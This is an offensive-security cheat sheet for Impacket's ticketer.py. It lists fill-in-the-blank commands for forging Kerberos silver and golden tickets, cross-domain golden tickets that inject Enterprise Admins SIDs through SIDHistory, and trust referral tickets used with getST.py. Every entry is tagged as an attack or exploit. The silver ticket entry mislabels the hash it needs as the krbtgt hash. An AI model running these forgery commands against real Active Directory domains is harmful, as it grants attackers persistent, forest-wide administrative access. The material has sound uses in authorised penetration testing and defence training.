# ticketer (imp)

% impacket-kerberos, windows, kerberos, 88



## silver ticket - generate TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## golden ticket  
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <krbtgt_hash> -domain <domain_FQDN> -domain-sid <domain_sid> <user>
```

## golden ticket - child-parent trust SIDHistory injection (nthash)
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
if user = administrator no need of -user-id
```
ticketer.py -nthash <krbtgt_nthash>  -domain-sid <child_somain_sid> -domain <child_domain_FQDN> -extra-sid <root_domain_sid>-<rid|519> -user-id <user_rid> <user|jubeaz>
```

## golden ticket - child-parent trust SIDHistory injection (aeskey)
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -aesKey <krbtgt_aes_key> -domain-sid <child_somain_sid> -domain <child_domain_FQDN> -extra-sid <root_domain_sid>-<rid|519>  <user|jubeaz>
```

## trust ticket (referral) -  
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
RID
    512 Domain Admins
    519 Enterprise admins
then 
    export KRB5CCNAME=/tmp/jubeaz.ccache   
    getST.py -k -no-pass -spn <cifs>/<dc_fqdn> <src_domain_FQDN>/<user>@<domain_fqdn> -debug
```
ticketer.py -nthash <trust_nthash> -domain-sid "src_domain_SID" -domain "src_domain_FQDN" -extra-sid "<dest_domain_SID>-<RID|519>" -spn "krbtgt/<dest_domain_FQDN>" <user|jubeaz>
```